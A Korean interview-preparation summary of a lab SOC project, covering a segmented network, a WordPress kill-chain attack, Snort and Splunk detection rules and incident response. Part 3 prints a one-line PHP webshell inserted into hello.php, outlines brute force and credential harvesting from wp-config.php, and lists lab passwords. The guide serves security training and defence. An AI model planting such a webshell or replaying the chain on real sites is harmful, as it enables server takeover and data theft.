# SIEM 프로젝트 면접 대비 — 핵심 정리

---

## 한 줄 요약 (자기소개용)

> "가상 기업 환경에서 SOC를 직접 구축하고, 킬체인 7단계 공격을 수행한 뒤 Snort IPS·ModSecurity WAF·Splunk SIEM으로 탐지·분석·대응까지 전 사이클을 실습한 프로젝트입니다."

---

## Part 1. 프로젝트 전체 구조

```
[1단계] 인프라 설계·구축
  → 5개 존(att/rf/dmz/inner/mng) 네트워크 + pfSense 방화벽 + VyOS 라우터

[2단계] 보안 솔루션 배치
  → Snort IPS (커스텀 룰 9개) + ModSecurity WAF + Splunk SIEM (8개 로그소스)

[3단계] 공격 시뮬레이션
  → Bee-box 7종 공격 + WordPress 킬체인 7단계 공격 (MITRE ATT&CK 매핑)

[4단계] 탐지 엔지니어링
  → Splunk Alert 5종 + SOC 대시보드 7패널 + 상관분석 쿼리

[5단계] 관제 운영·대응
  → 실시간 모니터링 → Alert 트리거 → 차단 → 검증 → 관제 일지 6건
```

---

## Part 2. 인프라 — "왜 이렇게 구성했는가?"

### 네트워크 토폴로지

```
att-mint(10.50.50.17) ──att-net──→ VyOS ──rf-net──→ pfSense(+Snort IPS)
Kali   (10.50.50.30) ─┘                                  │
                                                     ┌─ dmz-net ──→ WordPress(10.0.10.80)
                                                     │              Bee-box (10.0.10.50)
                                                     ├─ inner-net ──→ Splunk(10.0.100.50)
                                                     │                MySQL (10.0.100.60)
                                                     └─ mng-net ──→ mng-mint(10.0.50.100)
```

### 존(Zone) 설계 의도 — 면접에서 반드시 나오는 질문

| 존 | 서브넷 | 설계 의도 | 한 줄 답변 |
|----|--------|----------|-----------|
| att-net | 10.50.50.0/24 | 공격자 격리 | "실제 인터넷에서 유입되는 외부 공격을 시뮬레이션하기 위해 별도 네트워크로 분리했습니다" |
| rf-net | 10.0.0.0/24 | 전송 네트워크 | "모든 트래픽이 pfSense(Snort)를 반드시 통과하도록 강제하는 choke point입니다" |
| dmz-net | 10.0.10.0/24 | 웹서버 존 | "외부에 노출되는 웹서버를 내부 DB/SIEM과 분리하여, 웹서버 침해 시에도 내부망 확산을 방지합니다" |
| inner-net | 10.0.100.0/24 | 민감 자산 존 | "DB, SIEM 등 민감 자산을 보호하며, DMZ에서 MySQL 3306만 허용하고 나머지는 전부 차단합니다" |
| mng-net | 10.0.50.0/24 | 관제 존 | "SOC 분석가 전용 네트워크로, 공격 트래픽과 격리하여 관제 시스템 안전성을 확보합니다" |

### 핵심 설계 원칙 3가지

**Q: "네트워크 설계에서 어떤 보안 원칙을 적용했나요?"**

1. **Defense in Depth (심층 방어)**
   - L3 라우팅(VyOS)과 보안 필터링(pfSense+Snort)을 별도 장비로 분리
   - 네트워크(Snort) + 애플리케이션(ModSecurity) + 로그(Splunk) 3중 탐지

2. **Network Segmentation (네트워크 분리)**
   - 5개 존 분리로 Lateral Movement 경로 제한
   - DMZ 아웃바운드 차단 정책 설정 → 외부 유출 경로 제한

3. **Least Privilege (최소 권한)**
   - DMZ→inner-net은 WordPress→MySQL:3306만 허용
   - 나머지 전부 Default Deny

### 교육 과정 대비 확장 사항

**Q: "기본 랩에서 뭘 추가로 했나요?"**

| 항목 | 기본 랩 | 내가 확장한 것 |
|------|---------|-------------|
| 웹서버 | Bee-box 1대 | + **WordPress** (실제 CMS) |
| DB | Bee-box 내장 | **독립 MySQL 서버** (inner-net 별도) |
| WAF | 없음 | **ModSecurity + OWASP CRS** |
| 로그 소스 | 2개 | **8개** |
| 공격자 | 1대 | + **Kali Linux** |
| 탐지 | 기본 룰셋 | 커스텀 Snort 룰 9개 + Splunk Alert 5개 |
| 관제 | 없음 | SOC 대시보드 + 관제 일지 |

---

## Part 3. 공격 — 킬체인 7단계

### 전체 흐름 (1분 설명용)

> "외부 공격자가 WordPress 홈페이지를 대상으로 WPScan 정찰 → sqlmap SQLi 시도(실패) → hydra 브루트포스(성공) → 웹쉘 삽입 → 내부 정찰로 DB 인증정보 획득 → MySQL 접근하여 사용자 데이터 조회 성공 → curl로 외부 유출 시도했으나 Connection refused로 전송 실패"

### 각 단계 상세

| # | 단계 | 도구 | MITRE ATT&CK | 핵심 결과 |
|---|------|------|-------------|----------|
| 1 | 정찰 | WPScan, nmap | T1595 | WP 7.1 식별, XML-RPC 활성화, Upload 디렉토리 리스팅 노출 |
| 2 | SQLi 시도 | sqlmap | T1190 | **실패** — WP 코어 Prepared Statement 보호. 하지만 공격 시도 자체가 로그에 기록 |
| 3 | 브루트포스 | hydra | T1110 | **성공** — admin/rlaquddn1@ (965건 시도, 약 30초) |
| 4 | 웹쉘 | WP File Manager | T1505.003 | hello.php에 `shell_exec($_GET['cmd'])` 삽입 |
| 5 | 내부 정찰 | 웹쉘 CLI | T1046 | wp-config.php에서 DB 인증정보(wp_admin/WpAdmin!2024) 획득 |
| 6 | DB 탈취 | mysql (웹쉘 경유) | T1213 | wp_users 테이블 — admin 계정 + bcrypt 해시 |
| 7 | 유출 시도 | curl | T1041 | **실패** — Connection refused. 원인: 방화벽 아웃바운드 차단 또는 수신 서비스 미존재 (확인 필요) |

### 자주 나오는 꼬리 질문

**Q: "SQLi가 왜 실패했나요?"**
> WordPress 코어는 `$wpdb->prepare()`로 Prepared Statement를 사용합니다. 검색 파라미터(`?s=`)는 바인딩 처리되어 SQLi가 불가능합니다. 실제 공격에서는 취약한 플러그인을 통한 SQLi가 주 벡터입니다.

**Q: "브루트포스에 hydra를 쓴 이유는?"**
> HTTP POST 폼 기반 브루트포스에 hydra가 적합합니다. `-t 14`로 동시 스레드를 제한하고, WordPress 한국어 환경에서 실패 조건을 `F=login_error`로 맞춰야 정확한 결과를 얻을 수 있었습니다.

**Q: "웹쉘을 어떻게 삽입했나요?"**
> 브루트포스로 admin 계정을 획득한 뒤, WP File Manager 플러그인(CVE-2020-25213 시뮬레이션)으로 hello.php(Hello Dolly 플러그인)를 직접 편집하여 `if(isset($_GET['cmd'])){ echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; die(); }` 코드를 삽입했습니다.

**Q: "유출이 왜 실패했나요?"**
> curl 실행 시 Connection refused가 발생했습니다. 원인은 두 가지 가능성이 있습니다: (1) pfSense DMZ 아웃바운드 차단 정책, (2) 공격자 측 수신 서비스 미구동. 정확한 원인 확인에는 pfSense 방화벽 로그 분석이 필요합니다. 다만, DMZ 아웃바운드 차단 정책 자체는 설정되어 있어 네트워크 세그멘테이션의 효과는 유효합니다.

**Q: "유출이 실패했으니 공격이 성공한 건 아닌 거 아닌가요?"**
> 아닙니다. 공격자가 DB 데이터를 조회(SELECT)하는 데까지는 성공했습니다. 외부로 전송하는 것만 차단된 것이고, 공격자가 DNS 터널링이나 HTTP 응답 body에 데이터를 삽입하는 등의 우회 경로를 시도할 수 있습니다. 따라서 유출 차단만으로 안심할 수 없고, DB 접근 자체를 탐지·차단하는 것이 필요합니다.

---

## Part 4. 탐지 엔지니어링

### Snort 커스텀 룰 (9개)

**Q: "기본 Snort 룰셋만으로 부족했나요?"**
> 네. GPLv2 + ET Open 기본 룰셋은 범용 시그니처라서 WordPress 특화 공격(WPScan User-Agent, wp-login.php 브루트포스 등)을 세밀하게 탐지하지 못합니다. 그래서 킬체인 각 단계에 맞는 커스텀 룰 9개를 직접 작성했습니다.

**주요 룰 예시 (git local.rules 기준):**
```
# SID 1000001: WP Login 브루트포스 (5회/60초 초과)
alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"[LOCAL] WordPress Login Brute Force Attempt"; 
  content:"POST"; http_method; content:"/wp-login.php"; http_uri; content:"log="; http_client_body;
  threshold:type both, track by_src, count 5, seconds 60; sid:1000001; rev:1;)

# SID 1000007: 웹쉘 명령 출력 (응답에서 uid=+gid= 패턴)
alert tcp $HOME_NET $HTTP_PORTS -> any any (msg:"[LOCAL] Possible Webshell Command Output in Response"; 
  content:"uid="; content:"gid="; distance:0; within:30; sid:1000007; rev:1;)

# SID 1000009: WPScan 스캐너 탐지
alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"[LOCAL] WPScan Scanner Detected"; 
  content:"WPScan"; http_header; sid:1000009; rev:1;)
```

> **⚠️ 면접 참고**: pfSense에 실제 배포된 SID는 git 버전과 번호가 다릅니다 (예: pfSense SID 1000001 = WPScan 탐지, git SID 1000009 = WPScan 탐지). 운영 중 수동 수정으로 발생한 차이이며, 이 점을 인지하고 있다고 답하면 됩니다.

### Splunk Alert (5종)

| Alert | Severity | 쿼리 핵심 | 트리거 조건 |
|-------|----------|----------|-----------|
| Brute Force Detection | Critical | `idx_web "wp-login.php" "POST"` | ≥10건/5분 |
| Scanner Detection | High | `pfsense "1000001"` | ≥10건/5분 |
| SQL Injection Detection | Critical | `pfsense ("SQL" OR "1000004")` | ≥2건/5분 |
| Webshell Detection | Critical | `idx_web "cmd="` | ≥1건/5분 |
| WAF Alert Surge | Medium | `idx_web "ModSecurity"` | ≥30건/10분 |

### 탐지 결과 핵심 수치

- 7단계 중 **5단계에서 공격 시도 탐지** (로그 기록 또는 IPS 경보), 1단계 부분 탐지 (DB 접근), 1단계 외부 전송 실패
- Splunk Alert 5종 중 **4종 정상 트리거** (Scanner Detection은 cron 타이밍 미스매치로 미표시)
- Snort 브루트포스: **8건** (threshold 집계) vs Apache POST: **965건** (요청 수, 실패·성공 미구분) → 다중 소스 상관분석 필요성 입증

---

## Part 5. 관제 운영·대응

### SOC 대시보드 (7패널)

| 패널 | 내용 | 공격 시 변화 |
|------|------|------------|
| events | 전체 이벤트 수 | 80,425 → 83,916건 |
| time | 시간대별 추이 | 18:49~19:40 급증 |
| att_type | 공격 유형 파이차트 | ET SCAN 비율 급증 |
| att_ip | 공격자 IP Top5 | 10.50.50.30 최다 |
| waf | WAF 탐지 현황 | Rule 949110, 913100 |
| alerts | Snort 경보 | ET SCAN, SID 1000004 |
| login_history | 로그인 IP별 | 10.50.50.30: 965건 |

### 대응 타임라인

```
18:49  WPScan 정찰 탐지         → L1 모니터링
19:16  브루트포스 시작 (965건)    → L2 대응 준비
19:20  Brute Force Alert 트리거  → 공격 확정
19:24  SQL Injection (4건)       → 에스컬레이션
19:30  웹쉘 명령 실행 탐지        → L3 긴급 대응
19:35  DB 데이터 유출 확인        → L4 긴급 대응
19:40  pfSense WAN Block 적용    → 10.50.50.30 전체 차단
19:40~ 차단 검증                 → curl 타임아웃, WPScan Aborted
```

### 관제 일지 (6건)

| 번호 | 제목 | 위험도 | MITRE | 탐지 소스 |
|------|------|--------|-------|----------|
| INC-001 | WPScan 정찰 | Medium | T1595 | Snort ET SCAN |
| INC-002 | 브루트포스 | Critical | T1110 | Splunk Alert + ModSecurity |
| INC-003 | SQL Injection | Critical | T1190 | Snort SID 1000004 |
| INC-004 | 웹쉘 명령 실행 | Critical | T1505.003 | Splunk Alert + ModSecurity |
| INC-005 | DB 데이터 유출 | Critical | T1213 | 웹쉘 cmd= 로그 (간접) |
| INC-006 | IP 차단·검증 | — | — | pfSense WAN Block |

---

## Part 6. 개선 권고 & 한계

### 탐지 한계와 개선 방안

| 한계 | 원인 | 개선 방안 |
|------|------|----------|
| 브루트포스 Snort 경보 수 적음 (8건/POST 965건) | Snort threshold 기반 집계로 단순 비교 부정확. Apache POST 수는 실패·성공 미구분 | Apache 로그 기반 Alert을 주 소스로 운용. 로그인 실패만 카운트하도록 개선 필요 |
| DB 접근 정상/비정상 구분 불가 | 웹쉘이 정상 DB 연결 경로(3306) 사용 | MySQL Audit Plugin + 비정상 쿼리 패턴 Alert |
| WAF 탐지만 하고 차단 안 함 | SecRuleEngine DetectionOnly 모드 | SecRuleEngine On 전환 |
| DMZ→MySQL 3306 허용이 공격 피벗에 악용 | WordPress DB 연동에 필요 | DB 프록시 도입 또는 쿼리 화이트리스트 |
| Scanner Alert cron 타이밍 미스매치 | 5분 주기 cron으로 실시간성 부족 | Real-time Alert 또는 1분 주기 |

### 실무 확장 사항

**Q: "실무와 다른 점이 뭐가 있을까요?"**

1. **IP 평판 조회**: 실습에서는 공격자 IP가 명확하지만, 실무에서는 VirusTotal/AbuseIPDB로 평판 확인 필요
2. **Lateral Movement 모니터링**: 웹쉘에서 3306 외 다른 포트 접근 시도 확인
3. **MySQL Audit Plugin**: 쿼리 레벨 로깅으로 비정상 DB 접근 탐지
4. **유출 경로 다각화**: DNS 터널링, HTTP 응답 body 삽입 등 우회 가능성
5. **EDR 연계**: 프로세스 트리 분석(www-data → shell_exec → mysql)
6. **AI 관제**: 10건 시점에서 비정상 패턴 자동 인식, 킬체인 패턴 조기 경보

---

## Part 7. 예상 면접 질문 & 답변

### 프로젝트 전체

**Q: "이 프로젝트를 왜 했나요?"**
> SOC 관제 업무에서 가장 중요한 건 "공격이 어떻게 이루어지는지 이해하는 것"이라고 생각했습니다. 그래서 공격자 관점에서 킬체인을 직접 수행하고, 방어자 관점에서 탐지 룰을 설계하고, 실제로 Alert이 뜨는지 검증하는 전체 사이클을 경험하고 싶었습니다.

**Q: "프로젝트에서 가장 어려웠던 점은?"**
> 두 가지입니다. 첫째, Snort 커스텀 룰 작성 시 오탐/미탐 균형을 맞추는 것이 어려웠습니다. 예를 들어 `cmd=` 패턴은 정상 URL에도 나올 수 있어서 HTTP URI 필드로 한정하고 임계값을 조정해야 했습니다. 둘째, 다중 로그 소스 간 시간 동기화 문제가 있었습니다. pfSense는 UTC로 보내고 Splunk는 KST로 표시하는데, 타임라인 분석 시 혼동이 있었습니다.

**Q: "이 프로젝트에서 뭘 배웠나요?"**
> 단일 보안 솔루션으로는 모든 공격을 탐지할 수 없다는 것을 체감했습니다. Snort는 브루트포스 POST 965건 중 8건의 경보만 생성했지만, Apache 로그에서는 965건의 요청이 전부 기록됩니다. 이것이 SIEM에서 다중 소스 상관분석이 필요한 이유이고, SOC 분석가는 단일 Alert이 아닌 전체 킬체인 흐름을 봐야 한다는 것을 배웠습니다.

### 인프라

**Q: "VyOS와 pfSense를 왜 분리했나요?"**
> Defense in Depth 원칙입니다. VyOS는 순수 L3 라우팅(NAT, 스태틱 라우팅)만 담당하고, pfSense는 방화벽 룰 + Snort IPS를 담당합니다. 역할을 분리하면 하나가 우회되어도 다른 레이어가 방어합니다.

**Q: "DMZ는 왜 필요한가요?"**
> 외부에 노출되는 서비스(웹서버)를 내부 네트워크(DB, SIEM)와 분리하기 위해서입니다. 이번 프로젝트에서 실제로 웹쉘을 통해 WordPress 서버가 침해되었지만, 외부로의 데이터 전송 시도가 실패했습니다. DMZ 아웃바운드 차단 정책이 설정되어 있어 이것이 원인일 가능성이 높으나, 정확한 확인에는 방화벽 로그 분석이 필요합니다. DMZ가 없었다면 공격자가 내부망 전체에 접근할 수 있었을 겁니다.

**Q: "방화벽 정책을 어떻게 설정했나요?"**
> Default Deny 원칙입니다. WAN/DMZ/INNER-NET 모든 인터페이스에 기본 차단 정책을 설정하고, 필요한 통신만 화이트리스트로 허용했습니다. 예를 들어 DMZ에서 inner-net으로는 WordPress→MySQL:3306만 허용하고, 나머지는 전면 차단입니다.

### 공격

**Q: "MITRE ATT&CK을 왜 사용했나요?"**
> 공격을 체계적으로 분류하고, 각 단계에서 어떤 탐지가 가능한지 매핑하기 위해서입니다. 예를 들어 T1110(Brute Force)은 Credential Access Tactic에 해당하는데, 이 분류를 알면 "인증 강화(2FA)"가 근본적 대응이라는 것을 바로 판단할 수 있습니다.

**Q: "킬체인 7단계 중 가장 위험한 단계는?"**
> 4단계(웹쉘 삽입)입니다. 웹쉘이 설치되면 공격자가 서버에서 임의 명령을 실행할 수 있고, 이후 모든 단계(내부 정찰, DB 접근, 유출 시도)가 가능해집니다. 따라서 웹쉘 삽입을 막는 것(파일 업로드 제한, 플러그인 관리)과 즉시 탐지하는 것(cmd= 패턴 Alert)이 가장 중요합니다.

**Q: "Stored XSS가 왜 탐지 안 됐나요?"**
> Snort는 네트워크 패킷의 시그니처를 검사하는 IPS입니다. Stored XSS는 정상적인 HTTP POST로 악성 스크립트를 DB에 저장하는 것이라 패킷 자체는 정상처럼 보입니다. 이것이 WAF(ModSecurity)나 애플리케이션 레벨 로그가 필요한 이유입니다.

### 탐지

**Q: "Snort와 ModSecurity의 차이가 뭔가요?"**
> Snort는 네트워크 레벨 IPS로, 패킷 헤더와 페이로드의 시그니처를 매칭합니다. ModSecurity는 애플리케이션 레벨 WAF로, HTTP 요청/응답의 구조(헤더, body, URI)를 세밀하게 검사합니다. 예를 들어 hydra 브루트포스를 Snort는 8건 탐지했지만, ModSecurity는 User-Agent "Hydra"를 Rule 913100으로 정확히 탐지했습니다.

**Q: "왜 Splunk를 SIEM으로 선택했나요?"**
> 교육 과정에서 제공된 환경이기도 하지만, Splunk는 SPL(Search Processing Language)로 다양한 로그를 유연하게 분석할 수 있고, 대시보드와 Alert 기능이 강력합니다. 실무에서도 많이 사용되는 상용 SIEM이라 경험을 쌓기에 적합했습니다.

**Q: "상관분석(Correlation)이 왜 중요한가요?"**
> 단일 이벤트만 보면 정찰 스캔은 "Medium" 위험도입니다. 하지만 정찰 직후 브루트포스, 그 직후 SQLi가 이어진다면 이건 킬체인의 초기 단계이고 위험도가 Critical로 올라갑니다. Splunk에서 시간순 상관분석을 하면 이런 공격 흐름을 한눈에 파악할 수 있습니다.

**Q: "오탐(False Positive)은 어떻게 판별했나요?"**
> 세 가지 기준입니다. (1) 공격자 IP와 시간대 확인 — mng-mint(10.0.50.100)의 정상 접속 1건은 관리자 정상 접속으로 판별. (2) User-Agent 확인 — "Hydra", "WPScan", "sqlmap" 등 공격 도구 명시. (3) 요청 패턴 확인 — 동일 IP에서 초당 다수 POST는 정상 사용자 행동이 아님.

### 대응

**Q: "공격자 IP를 차단한 방법은?"**
> pfSense 방화벽의 WAN 인터페이스에 Block 룰을 추가했습니다. Source: 10.50.50.30, Protocol: TCP, Destination: Any로 설정하고, WAN 룰 최상단에 배치하여 모든 트래픽을 차단했습니다. 차단 후 curl 타임아웃과 WPScan Aborted를 확인하여 검증했습니다.

**Q: "차단 외에 추가로 할 일은?"**
> (1) 웹쉘 파일(hello.php) 제거 및 원본 복구, (2) admin 비밀번호 변경 + 2FA 적용, (3) WP File Manager 플러그인 제거, (4) wp-config.php 인증정보 변경, (5) MySQL 접근 로그 확인하여 유출된 데이터 범위 파악, (6) 동일 패턴의 다른 IP 확인

### 보안 프레임워크

**Q: "STRIDE가 뭔가요?"**
> 위협 모델링 프레임워크입니다. Spoofing(인증 위장), Tampering(변조), Repudiation(부인), Information Disclosure(정보 노출), Denial of Service(서비스 거부), Elevation of Privilege(권한 상승) 6가지로 위협을 분류합니다. 이번 프로젝트의 브루트포스는 Spoofing, 웹쉘 삽입은 Tampering, DB 탈취는 Information Disclosure에 해당합니다.

**Q: "PASTA는 뭔가요?"**
> Process for Attack Simulation and Threat Analysis — 비즈니스 맥락에서 위협의 우선순위를 매기는 프레임워크입니다. 기술적 심각도만이 아니라 비즈니스 영향을 함께 평가합니다. 예를 들어 wp-config.php 인증정보 노출은 기술적으로는 "High"이지만, 고객 DB 전체 접근이 가능하므로 비즈니스 영향은 "Critical"입니다.

### SOC/관제 역량

**Q: "SOC Tier 1, 2, 3의 차이는?"**
> Tier 1은 Alert 모니터링 및 초동 대응(정탐/오탐 판별), Tier 2는 심층 분석(로그 상관분석, 공격 경로 추적), Tier 3는 위협 헌팅(Alert 없이도 비정상을 찾는 능력)과 보안 아키텍처 개선입니다. 이 프로젝트에서 저는 Tier 1~2 수준의 업무(Alert 대응, 상관분석, 대응 조치)를 수행했습니다.

**Q: "관제 일지는 왜 작성하나요?"**
> 세 가지 이유입니다. (1) 사고 이력 관리 — 향후 유사 사고 발생 시 참고, (2) 에스컬레이션 근거 — L1→L2→L3 판단 과정 기록, (3) 개선 도출 — 탐지 실패/지연 원인 분석하여 룰 개선에 반영.

---

## Part 8. 기술 키워드 빠른 복습

| 키워드 | 한 줄 설명 |
|--------|----------|
| IDS/IPS | 침입탐지/방지시스템. Snort는 둘 다 가능 (이 프로젝트에서는 Alert Only로 IDS 역할) |
| WAF | 웹 애플리케이션 방화벽. HTTP 요청 레벨에서 공격 탐지 (ModSecurity + OWASP CRS) |
| SIEM | 보안정보이벤트관리. 다중 로그 수집·상관분석·경보 (Splunk) |
| Kill Chain | 공격 단계 모델. 정찰→무기화→전달→익스플로잇→설치→C2→목표달성 |
| MITRE ATT&CK | 공격 기술 분류 체계. Tactic(목적) + Technique(수단) 매트릭스 |
| DMZ | 비무장지대. 외부 서비스를 내부망과 분리하는 네트워크 존 |
| Lateral Movement | 횡이동. 하나의 시스템 침해 후 내부 네트워크의 다른 시스템으로 이동 |
| Choke Point | 모든 트래픽이 통과하는 집중 관제 지점 |
| Defense in Depth | 심층 방어. 다중 보안 레이어 배치 |
| IOC | Indicators of Compromise. 침해 지표 (악성 IP, User-Agent, 페이로드 패턴) |
| SPL | Search Processing Language. Splunk 쿼리 언어 |
| OWASP CRS | OWASP Core Rule Set. ModSecurity용 범용 보안 룰셋 |
| Prepared Statement | SQL 쿼리와 데이터를 분리하여 SQLi 방어하는 기법 |
| bcrypt | 단방향 해시 함수. WordPress 비밀번호 저장에 사용 |
| NAT | Network Address Translation. 내부 IP를 외부에 노출하지 않고 통신 |

---

## Part 9. 30초 / 1분 / 3분 프로젝트 설명

### 30초 버전
> "가상 기업의 SOC 환경을 직접 구축하고, 킬체인 7단계 공격을 수행한 뒤 Snort·WAF·Splunk 기반으로 탐지·대응까지 전체 사이클을 검증한 프로젝트입니다. 7단계 중 5단계에서 공격 시도를 탐지했고, 데이터 외부 유출 시도는 실패를 확인했습니다."

### 1분 버전
> "가상 기업 '테크솔루션'의 IT 인프라를 VMware에 구축하고, 5개 네트워크 존을 분리하여 Defense in Depth 아키텍처를 설계했습니다. 공격자 관점에서 WPScan 정찰부터 웹쉘 삽입, DB 탈취까지 킬체인 7단계를 수행하고, 방어자 관점에서 Snort 커스텀 룰 9개와 Splunk Alert 5종을 설계하여 탐지 체계를 구축했습니다. SOC 대시보드로 실시간 모니터링하며 관제 일지 6건을 작성하고, pfSense 방화벽으로 공격자 IP를 차단·검증했습니다. 핵심 발견은 Snort만으로는 브루트포스 POST 965건 중 8건의 경보만 발생하여, 다중 소스 상관분석이 필수라는 것입니다."

### 3분 버전
> 위 1분 버전 + 아래 내용 추가:
>
> "인프라는 교육 과정의 기본 랩(Bee-box 단일 서버)을 실제 기업 환경에 가깝게 확장했습니다. WordPress CMS, 독립 MySQL 서버, ModSecurity WAF를 추가하고, 로그 소스를 2개에서 8개로 늘렸습니다.
>
> 네트워크는 실제 기업 아키텍처를 참고하여 DMZ·내부망·관제망을 분리했고, 최소 권한 원칙에 따라 DMZ에서 inner-net으로는 MySQL 3306만 허용했습니다. 이 설계 아래에서 웹쉘로 서버가 침해되었음에도 데이터 외부 전송 시도가 실패했습니다.
>
> 탐지 관점에서 가장 인상적이었던 건 Snort(네트워크 레벨)와 Apache 로그(애플리케이션 레벨)의 탐지 차이입니다. hydra 브루트포스에서 Snort는 8건의 경보만 생성했지만 Apache 로그에서는 POST 요청 965건이 모두 기록되었고, ModSecurity WAF는 User-Agent 'Hydra'를 정확히 식별했습니다. 이것이 SIEM에서 다중 소스 상관분석이 필요한 이유입니다.
>
> 개선 권고로는 MySQL Audit Plugin 도입, ModSecurity 차단 모드 전환, DB 프록시 도입을 제안했고, 실무 확장 관점에서 STRIDE/PASTA 위협 모델링, EDR 연계, AI 기반 관제 자동화 방향도 정리했습니다."
